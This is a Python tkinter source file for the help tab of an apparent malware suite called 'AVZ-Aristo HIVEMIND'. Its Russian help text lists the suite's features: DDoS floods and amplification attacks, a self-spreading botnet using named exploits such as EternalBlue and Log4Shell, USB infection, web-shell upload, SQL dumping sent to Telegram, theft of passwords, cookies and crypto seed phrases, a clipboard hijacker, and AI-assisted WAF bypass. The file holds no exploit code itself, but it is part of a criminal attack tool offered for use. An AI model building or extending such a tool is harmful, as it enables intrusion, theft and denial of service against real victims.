import tkinter as tk
from tkinter import scrolledtext
import json

class HelpTab(tk.Frame):
    def __init__(self, parent):
        super().__init__(parent)
        self.build_ui()

    def build_ui(self):
        self.text = scrolledtext.ScrolledText(self, wrap=tk.WORD, width=80, height=30)
        self.text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.load_help()

    def load_help(self):
        try:
            with open("version.json", "r") as f:
                version = json.load(f).get("version", "unknown")
        except:
            version = "unknown"
        help_text = f"""
╔══════════════════════════════════════════════╗
║     AVZ-Aristo v{version} HIVEMIND            ║
╚══════════════════════════════════════════════╝

Ключевые возможности:

▸ DDoS арсенал:
  - L3/L4: UDP, TCP, SYN, ICMP, DNS Amp, NTP Amp, Memcached Amp, IP Flood
  - L7: Slowloris, HTTP, TLS Exhaustion, QUIC/HTTP3, DNS Water Torture
  - Комбинированные: Multivector Burst, Dynamic Attack, HTTP Desync Smuggling

▸ Ботнет HIVEMIND:
  - C2 WebSocket + P2P Kademlia
  - Авто-спредер (глобальный случайный поиск, Shodan/Censys)
  - Эксплойты: EternalBlue, BlueKeep, Zerologon, PrintNightmare,
    Follina, Log4Shell, MikroTik, Realtek SDK, PwnKit, Dirty Pipe
  - Самообучение (SQLite) – ускоряет заражение известных целей
  - Фишинг-инжектор (модификация hosts-файла)
  - USB-распространитель (заражение съёмных накопителей)
  - Облачная ферма (DigitalOcean/Linode/Vultr)
  - P2P-рынок ботов (заглушка с Monero)

▸ Веб-взлом:
  - SQL-инъектор (sqlmap + авто-дампер + отправка в Telegram)
  - CMS-эксплойтер (WordPress, Joomla, Drupal) + загрузка веб-шелла

▸ Эксфильтрация:
  - Сбор паролей, куки, скриншотов, seed-фраз криптокошельков
  - Крипто-хищник (перехват адресов в буфере обмена)

▸ Разведка:
  - whois, DNS, порты, SSL-сертификаты, HTTP-заголовки
  - Интеграция с Shodan API

▸ AI-модули:
  - AI-Анализ цели (рекомендация вектора, обход WAF/Cloudflare)
  - AI-Инженер (связь с VPS для авто-улучшения программы)

▸ Интерфейс:
  - 16 вкладок с подвкладками
  - 4 темы оформления (Cyber Light, Matrix, Blood, Midnight)
  - Конструктор пакетов (ручная настройка TCP/IP)
  - Визуальный конструктор цепочек атак (Drag-and-Drop)
  - Монитор атак в реальном времени (график + таблица)
  - Диагностика и автофикс проблем
  - Голосовое управление через Telegram
  - Мобильный дашборд (PWA)

Горячие клавиши: (в разработке)

Для получения подробной информации обратитесь к мастер-файлу
AVZ_MASTER_REFERENCE.md
"""
        self.text.insert(tk.END, help_text)
        self.text.config(state=tk.DISABLED)
